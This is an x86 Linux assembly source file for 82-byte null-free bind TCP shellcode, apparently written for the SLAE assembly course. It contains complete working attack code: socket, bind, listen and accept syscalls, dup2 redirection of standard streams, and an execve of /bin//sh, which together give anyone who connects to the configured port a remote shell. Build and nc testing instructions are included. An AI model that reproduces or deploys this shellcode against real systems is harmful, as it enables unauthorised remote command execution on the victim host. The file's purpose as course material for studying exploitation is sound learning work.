; Filename: bind_tcp_shellcode.nasm
; Author: Upayan a.k.a. slaeryan
; SLAE: 1525
; Contact: upayansaha@icloud.com
; Purpose: This is a x86 Linux bind TCP null-free shellcode.
; Usage: ./bind_tcp_shellcode
; Note: The C2 Port is configurable while assembling with the -D flag.
; Compile with:
; ./compile.sh bind_tcp_shellcode
; Testing: nc -v localhost 8080
; Size of shellcode: 82 bytes


global _start

section .text
_start:

	; Clearing the first 4 registers for 1st Syscall - socket()
	xor eax, eax          ; May also sub OR mul for zeroing out
	xor ebx, ebx          ; Clearing out EBX 
	xor ecx, ecx          ; Clearing out ECX
	cdq                   ; Clearing out EDX

	; Syscall for socket() = 359 OR 0x167, loading it in AX
	mov ax, 0x167

	; Loading 2 in BL for AF_INET - 1st argument for socket()
	mov bl, 0x02

	; Loading 1 in CL for SOCK_STREAM - 2nd argument for socket()
	mov cl, 0x01

	; 3rd argument for socket() - 0 is already in EDX register

	; socket() Syscall
	int 0x80

	; Storing the return value socket fd in EAX to EBX for later usage
	mov ebx, eax

	; Loading 0 to listen on all interfaces - sockaddr_in struct - 3rd argument
	push edx

	; Loading the C2 Port in stack - sockaddr_in struct - 2nd argument
	push word C2_PORT      ; 0x901f - C2 Port: 8080

	; Loading AF_INET OR 2 in stack - sockaddr_in struct - 1st argument
	push word 0x02

	; bind() Syscall
	mov ax, 0x169          ; Syscall for bind() = 361 OR 0x169, loading it in AX
	mov ecx, esp           ; Moving sockaddr_in struct from TOS to ECX
	mov dl, 16             ; socklen_t addrlen = 16
	int 0x80               ; Execute the bind syscall

	; listen() Syscall
	mov ax, 0x16b          ; Syscall for listen() = 363 or 0x16b, loading it in AX
	xor ecx, ecx           ; Clearing ECX for listen syscall
	int 0x80               ; Execute listen syscall

	; accept() Syscall 
	mov ax, 0x16c          ; Syscall for accept4() = 364 or 0x16c, loading it in AX
	; 1st argument for accept() - sockfd - still in EBX
	; 2nd argument for accept() - 0 - still in ECX
    cdq                    ; Clearing EDX for 3rd argument - 0
    xor esi, esi           ; Clearing ESI for 4th argument - 0
    int 0x80               ; Execute accept4 syscall

    ; Storing the return value connection socket fd in EAX to EBX for later usage
	mov ebx, eax

	mov cl, 0x3            ; Initializing a counter variable = 3 for loop

	; dup2() Syscall in loop
	loop_dup2:
	mov al, 0x3f           ; dup2() Syscall number = 63 OR 0x3f
	dec ecx                ; Decrement ECX by 1
	int 0x80               ; Execute the dup2 syscall
	jnz short loop_dup2    ; Jump back to loop_dup2 label until ZF is set

	; execve() Syscall
    push edx               ; push for NULL termination - EDX already set to 0
    push dword 0x68732f2f  ; push //sh
	push dword 0x6e69622f  ; push /bin
	mov ebx, esp           ; store address of TOS - /bin//sh
	mov al, 0x0b           ; store Syscall number for execve() = 11 OR 0x0b in AL
	int 0x80               ; Execute the system call